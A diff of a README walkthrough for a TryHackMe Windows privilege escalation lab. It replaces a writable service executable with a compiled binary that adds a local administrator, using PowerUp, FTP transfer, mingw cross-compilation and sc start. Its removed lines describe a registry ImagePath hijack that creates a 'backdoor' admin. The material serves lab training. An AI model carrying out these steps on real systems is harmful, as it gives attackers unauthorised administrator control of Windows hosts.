@@ -1,22 +1,27 @@
 # service-escalation-executable-files
 
-*credit to HTM* | https://tryhackme.com/room/windowsprivescarena
+*credit to THM* | https://tryhackme.com/room/windowsprivescarena
 
 1) Start PowerShell:
 
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`C:\Users\user> powershell -ep bypass`
 
-[![Image of get-acl](https://github.com/kam1n0/service-escalation-executable/blob/master/tmp_upload/get-acl.png)](#)
+2) Run *PowerUp.ps1*:
 
-2) Start *pyftpdlib* on Kali:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`PS C:\Users\user> . ./PowerUp.ps1`
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`PS C:\Users\user> Invoke-AllChecks`
 
-[![Image of pyftpdlib](https://github.com/kam1n0/service-escalation-executable/blob/master/tmp_upload/pyftpdlib.png)](#)
+* Note that the 'Everyone' user group has full permissions on the 'filepermservice.exe' service executable.
+
+3) Start *pyftpdlib* on Kali:
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`$ python3 -m pyftpdlib -p 21 --write`
 
 * Note: if pyftpdlib is not installed do the following:
 
 [![Image of install](https://github.com/kam1n0/service-escalation-executable/blob/master/tmp_upload/install.png)](#)
 
-3) Copy *windows_service.c* from windows machine:
+4) Copy *windows_service.c* from windows machine:
 
 [![Image of ftp](https://github.com/kam1n0/service-escalation-executable/blob/master/tmp_upload/ftp.png)](#)
 
@@ -24,43 +29,30 @@
 
 [![Image of upload](https://github.com/kam1n0/service-escalation-executable/blob/master/tmp_upload/upload.png)](#)
 
-4) Edit *windows_service.c* to include the command to add a new user:
+5) Edit *windows_service.c* to include the command to add a new user:
 
 [![Image of edit](https://github.com/kam1n0/service-escalation-executable/blob/master/tmp_upload/edit.png)](#)
 
-5) Compile *windows_service.c*:
+6) Compile *windows_service.c*:
 
 [![Image of compile](https://github.com/kam1n0/service-escalation-executable/blob/master/tmp_upload/compile.png)](#)
 
 * Note: install *gcc-wingw-w64* if it is not installed
 
-[![Image of gcc_install](https://github.com/kam1n0/service-escalation-executable/blob/master/tmp_upload/gcc_install.png)](#)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`$ sudo apt-get install gcc-mingw-w64`
 
-6) Transfer *x.exe* to windows victim machine:
+7) Transfer *filepermservice.exe* to windows victim machine:
 
 [![Image of transfer](https://github.com/kam1n0/service-escalation-executable/blob/master/tmp_upload/transfer.png)](#)
 
-7) Copy *x.exe* to C:\Temp:
+8) Copy *filepermservice.exe* to C:\Program Files\File Permissions Service:
 
-[![Image of copy](https://github.com/kam1n0/service-escalation-executable/blob/master/tmp_upload/copy.png)](#)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`C:\Users\user\Desktop> cp filepermservice.exe C:\Program Files\File Permissions Service`
 
-8) Execute *x.exe*::
+9) Start *filepermsvc* service:
 
-[![Image of execute](https://github.com/kam1n0/service-escalation-executable/blob/master/tmp_upload/execute.png)](#)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`C:\Users\user\Desktop> sc start filepermsvc`
 
-- Here is the breakdown of this*reg add* command:
-  - 'reg add' is adding to the 'regsvc' registry
-  - 'v' is adding a registry value of 'ImagePath'
-  - 'ImagePath' is a registry key that contains the path of the drivers image file
-   - If we place an executable here, when we tell the service to start in the ImagePath, it is going to run the executable
-  - 't' is of the type REG_EXPAND, which is saying "this is a string value"
-   - The "string value" is the /d (data) C:\temp\x.exe
-  - 'f' says to not provide any prompts
+10) Confirm that the user was added to the local administrators group by typing the following:
 
-9) In the command prompt, type *'sc start regsvc'*:
-
-[![Image of start](https://github.com/kam1n0/service-escalation-executable/blob/master/tmp_upload/start.png)](#)
-
-10) We can then execute *net local group administrators*, and see that our new administrator user 'backdoor' was added:
-
-[![Image of backdoor](https://github.com/kam1n0/service-escalation-executable/blob/master/tmp_upload/backdoor.png)](#)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`C:\Users\user\Desktop> net localgroup administrators`
